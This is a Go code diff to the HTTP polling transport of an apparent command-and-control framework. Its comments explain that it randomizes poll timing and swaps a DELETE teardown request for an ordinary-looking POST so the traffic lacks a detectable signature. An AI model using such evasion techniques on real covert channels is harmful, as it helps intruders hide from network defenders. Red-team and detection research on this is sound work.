@@ -89,6 +89,27 @@ func WriteBareStatus(w http.ResponseWriter, status int) {
 	w.WriteHeader(status)
 }
 
+// http_poll timing is randomized: a fixed long-poll hold and a fixed re-poll
+// delay are both usable as a transport signature.
+const (
+	httpPollHoldMin = 35 * time.Second
+	httpPollHoldMax = 70 * time.Second
+	httpBlinkMin    = 50 * time.Millisecond
+	httpBlinkMax    = 300 * time.Millisecond
+)
+
+func randomPollHold() time.Duration {
+	minMs := int(httpPollHoldMin / time.Millisecond)
+	maxMs := int(httpPollHoldMax / time.Millisecond)
+	return time.Duration(util.RandInt(minMs, maxMs)) * time.Millisecond
+}
+
+func randomBlink() time.Duration {
+	minMs := int(httpBlinkMin / time.Millisecond)
+	maxMs := int(httpBlinkMax / time.Millisecond)
+	return time.Duration(util.RandInt(minMs, maxMs)) * time.Millisecond
+}
+
 func (h HTTPChannelWrapper) Dial(ctx context.Context, client *http.Client, url string) (io.ReadWriteCloser, *http.Response, error) {
 	sessionID := uuid.NewString()
 
@@ -224,11 +245,11 @@ func (s *HTTPClientStream) pollRead() {
 			}
 		}
 
-		// If we just got data, don't sleep for the full interval
-		// Instead, perform a short "blink" to pull the rest of the stream
+		// If we just got data, don't sleep for the full interval. Instead,
+		// perform a short, randomized "blink" to pull the rest of the stream.
 		if gotData {
 			select {
-			case <-time.After(100 * time.Millisecond):
+			case <-time.After(randomBlink()):
 				continue
 			case <-s.ctx.Done():
 				return
@@ -328,8 +349,10 @@ func (s *HTTPClientStream) Close() error {
 		u += s.config.C2Path
 	}
 
-	// Notify server to teardown the virtual session
-	req, _ := http.NewRequest(http.MethodDelete, u, nil)
+	// Notify server to teardown the virtual session. The close is carried in the
+	// configured header/cookie, not a distinctive HTTP method, so the request
+	// looks like an ordinary poll/write.
+	req, _ := http.NewRequest(http.MethodPost, u, nil)
 	applyMalleableConfig(req, s.config, s.sessionID)
 	if s.config != nil {
 		setMalleableHeader(req.Header, s.config.CloseHeader, s.config.CloseValue, s.sessionID)
@@ -452,16 +475,13 @@ func HandleHTTPServerSession(w http.ResponseWriter, req *http.Request, config *d
 		return stream, nil
 	}
 
-	// Check Close
+	// Check Close. The close is carried in the configured header/cookie, never
+	// in a distinctive HTTP method (a DELETE here is a protocol tell).
 	isClose := false
-	if strings.EqualFold(config.CloseHeader, "Cookie") || req.Method == http.MethodDelete {
-		if req.Method == http.MethodDelete {
+	if strings.EqualFold(config.CloseHeader, "Cookie") {
+		c2_cookie, cookieErr := req.Cookie(strings.Split(config.CloseValue, "=")[0])
+		if cookieErr == nil && c2_cookie.Value == strings.Split(config.CloseValue, "=")[1] {
 			isClose = true
-		} else {
-			c2_cookie, cookieErr := req.Cookie(strings.Split(config.CloseValue, "=")[0])
-			if cookieErr == nil && c2_cookie.Value == strings.Split(config.CloseValue, "=")[1] {
-				isClose = true
-			}
 		}
 	} else {
 		isClose = req.Header.Get(config.CloseHeader) == config.CloseValue
@@ -507,8 +527,9 @@ func HandleHTTPServerSession(w http.ResponseWriter, req *http.Request, config *d
 			WriteBareStatus(w, http.StatusNotFound)
 			return nil, ErrPollingRequest
 		}
-		// Client is reading from us
-		pollTimeout := 50 * time.Second
+		// Client is reading from us. The hold is randomized so the polling
+		// cadence is not a fixed signature.
+		pollTimeout := randomPollHold()
 		if stream.isClosing() {
 			pollTimeout = 500 * time.Millisecond
 		}
